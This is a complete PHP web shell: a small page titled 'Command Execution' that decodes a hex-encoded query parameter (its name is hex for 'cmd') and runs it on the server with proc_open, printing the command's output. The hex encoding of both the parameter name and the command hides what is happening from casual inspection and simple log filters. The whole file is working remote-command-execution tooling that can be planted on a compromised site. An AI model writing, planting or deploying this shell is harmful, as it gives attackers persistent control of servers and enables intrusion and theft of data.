<?php
function executeCommand($command)
{
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($command, $descriptorspec, $pipes);

    if (is_resource($process)) {
        // Read output from stdout and stderr
        $output_stdout = stream_get_contents($pipes[1]);
        $output_stderr = stream_get_contents($pipes[2]);

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        $return_value = proc_close($process);

        return "Output (stdout):\n" . $output_stdout . "\nOutput (stderr):\n" . $output_stderr;
    } else {
        return "Failed to execute command.";
    }
}

if (isset($_GET['636d64'])) {
    $command = hex2bin($_GET['636d64']);
    $result = executeCommand($command);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Command Execution</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        h1 {
            color: #444;
        }
        form {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="text"] {
            width: 100%;
            padding: 5px;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            padding: 10px;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <h1>Command Execution</h1>
    <form method="GET">
        <label>Enter command in hexadecimal format , encode your command on https://encode-decode.com/bin2hex-decode-online/ :</label>
        <input type="text" name="636d64" placeholder="e.g., 6c73306c 616c6c">
        <input type="submit" value="Execute">
    </form>

    <?php if (isset($result)): ?>
        <h2>Result:</h2>
        <pre><?php echo htmlspecialchars($result); ?></pre>
    <?php endif; ?>
</body>
</html>
